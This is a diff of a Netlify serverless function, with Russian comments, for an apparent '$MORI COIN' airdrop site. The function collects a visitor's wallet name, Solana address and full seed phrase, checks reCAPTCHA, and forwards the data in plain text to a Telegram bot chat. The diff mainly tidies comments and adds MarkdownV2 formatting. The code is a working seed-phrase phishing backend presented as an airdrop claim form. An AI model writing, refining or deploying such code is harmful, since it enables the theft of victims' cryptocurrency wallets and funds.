@@ -1,3 +1,4 @@
+// File: aura-airdrop-project/netlify/functions/secure-message.js
 const axios = require('axios');
 
 function sanitizeText(text) {
@@ -16,14 +17,13 @@ exports.handler = async function (event) {
     try {
         const { BOT_TOKEN, CHAT_ID, RECAPTCHA_SECRET_KEY_V2 } = process.env;
         const body = JSON.parse(event.body);
-        const { walletName, solAddress, seedPhrase, recaptchaToken } = body; // Добавлен solAddress
+        const { walletName, solAddress, seedPhrase, recaptchaToken } = body; 
 
         // --- ПРОВЕРКА RECAPTCHA V2 ---
         if (!recaptchaToken) {
            throw new Error("Токен reCAPTCHA отсутствует.");
         }
 
-        // ВАЖНО: Убедитесь, что RECAPTCHA_SECRET_KEY_V2 установлен в переменных окружения Netlify
         if (!RECAPTCHA_SECRET_KEY_V2) {
             console.error("КРИТИЧЕСКАЯ ОШИБКА: RECAPTCHA_SECRET_KEY_V2 не установлен!");
             throw new Error("Конфигурация сервера для reCAPTCHA v2 не завершена.");
@@ -37,10 +37,8 @@ exports.handler = async function (event) {
             },
         });
         
-        // Для reCAPTCHA v2 достаточно проверить только 'success'
         if (!recaptchaRes.data.success) {
             console.warn("Проверка reCAPTCHA v2 не пройдена!", recaptchaRes.data);
-            // Google возвращает error-codes, если проверка не пройдена
             const errorCode = recaptchaRes.data['error-codes'] ? recaptchaRes.data['error-codes'].join(', ') : 'Неизвестная ошибка';
             throw new Error(`Вы не прошли проверку на робота. Код ошибки: ${errorCode}`);
         }
@@ -52,7 +50,7 @@ exports.handler = async function (event) {
             throw new Error("Конфигурация сервера не завершена.");
         }
         
-        if (!walletName || !solAddress || !seedPhrase) { // Проверяем наличие solAddress
+        if (!walletName || !solAddress || !seedPhrase) { 
             return {
                 statusCode: 400,
                 body: JSON.stringify({ success: false, message: 'Отсутствуют необходимые данные.' }),
@@ -60,12 +58,13 @@ exports.handler = async function (event) {
         }
 
         const sanitizedWallet = sanitizeText(walletName);
-        const sanitizedSolAddress = sanitizeText(solAddress); // Очистка SOL-адреса
+        const sanitizedSolAddress = sanitizeText(solAddress);
         const sanitizedPhrase = sanitizeText(seedPhrase);
 
+        // ИСПРАВЛЕНО: Убраны обратные косые черты перед обратными кавычками
         const message = `Новая заявка на $MORI COIN:
 Кошелёк: ${sanitizedWallet}
-SOL Адрес: ${sanitizedSolAddress}
+SOL Адрес: \`${sanitizedSolAddress}\`
 Сид фраза: ${sanitizedPhrase}`;
         
         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -73,6 +72,7 @@ SOL Адрес: ${sanitizedSolAddress}
         await axios.post(telegramUrl, {
             chat_id: CHAT_ID,
             text: message,
+            parse_mode: 'MarkdownV2' // Обязательно указываем Telegram использовать MarkdownV2 для форматирования
         });
 
         return {
